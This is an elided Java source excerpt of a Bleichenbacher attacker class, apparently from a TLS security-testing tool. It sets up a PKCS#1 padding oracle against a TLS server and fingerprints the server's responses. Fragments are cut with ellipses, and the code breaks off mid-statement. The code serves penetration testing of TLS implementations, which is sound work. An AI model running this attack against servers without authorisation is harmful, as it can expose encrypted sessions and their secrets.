...
public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig> {
    ...
    public void executeAttack() {
        ...
        if ((pms.length * Bits.IN_A_BYTE) != publicKey.getModulus().bitLength()) {
            throw new ConfigurationException(
                    "The length of the encrypted premaster secret you have "
        ...
        RealDirectMessagePkcs1Oracle oracle =
                new RealDirectMessagePkcs1Oracle(
                        publicKey,
                        getTlsConfig(),
                        extractValidFingerprint(
                                publicKey, tlsConfig.getDefaultHighestClientProtocolVersion()),
                        null,
                        config.getWorkflowType());
    ...
    private ResponseFingerprint extractValidFingerprint(
            RSAPublicKey publicKey, ProtocolVersion version) {
        Pkcs1Vector vector = Pkcs1VectorGenerator.generateCorrectPkcs1Vector(publicKey, version);
        State state =
                new State(
                        tlsConfig,
                        BleichenbacherWorkflowGenerator.generateWorkflow(
                                tlsConfig, config.getWorkflowType(), vector.getEncryptedValue()));
        FingerPrintTask fingerPrintTask =
                new FingerPrintTask(
                        state,
                        additionalTimeout,
                        ...
                        executor.getReexecutions(),
                        additionalTcpTimeout);
        FingerprintTaskVectorPair stateVectorPair =
